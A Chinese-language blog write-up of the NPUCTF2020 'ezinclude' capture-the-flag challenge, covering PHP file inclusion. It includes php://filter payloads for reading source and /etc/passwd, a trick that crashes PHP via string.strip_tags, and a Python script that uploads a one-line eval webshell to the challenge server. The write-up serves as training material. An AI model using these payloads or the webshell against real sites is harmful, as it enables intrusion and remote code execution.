NPUCTF2020-ezinclude

发表于2020-11-06|更新于2021-05-08
|字数总计:630|阅读时长:2分钟|阅读量:

当你想结束的时候，不如想想当初为什么开始。

00a.提示

先看看源码，发现提示为如下内容

username/password error<html>
<!--md5($secret.$name)===$pass -->
</html>

可以看到页面定位到了这里，访问该页面/flflflflag.php，得到如下结果

这里可以用php伪协议读取源码，这里我们首先选择使用file协议读取源代码。后来发现用file协议读不到关键的flflflflag.php文件，那就还用php伪协议读取文件
php://filter/convert.base64-encode/resource=flflflflag.php

00b.源码

/flflflflag.php?file=php://filter/convert.base64-encode/resource=flflflflag.php
，解码后可得到flflflflag.php文件的内容为:
flflflflag.php

<html>
<head>
<script language="javascript" type="text/javascript">
           window.location.href="404.html";
</script>
<title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>
</head>
<>
<body>
<?php
$file=$_GET['file'];
if(preg_match('/data|input|zip/is',$file)){
	die('nonono');
}
@include($file);
echo 'include($_GET["file"])';
?>
</body>
</html>

00c.代码审计

关键的php代码为:

<?php
$file=$_GET['file'];
if(preg_match('/data|input|zip/is',$file)){
	die('nonono');
}
@include($file);
echo 'include($_GET["file"])';
?>

这里禁用了data、input、zip、is。

看wp，可以利用php://filter/string.strip_tags导致php崩溃，同时可上传文件保存在/tmp目录来上传木马。
漏洞解析

00d.exploit

payload如下

/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd

师傅的脚本

import requests


from io import BytesIO
file_data={
	'file': BytesIO("<?php eval($_POST[sword]);")
}
'''
使用PYTHON上传马的固定格式应该就这样吧。
'''

url="http://a83bc40c-ca4d-46b2-92b5-4ee0d17edafd.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"

try:
	r=requests.post(url=url,files=file_data,allow_redirects=False)
except:
    print(1)

这里怎么找到我们刚才上传的马呢？这里可以应该爆破，但是师傅们好像扫描到了更方便的东西。访问dir.php可以echo出我们上传的文件的信息
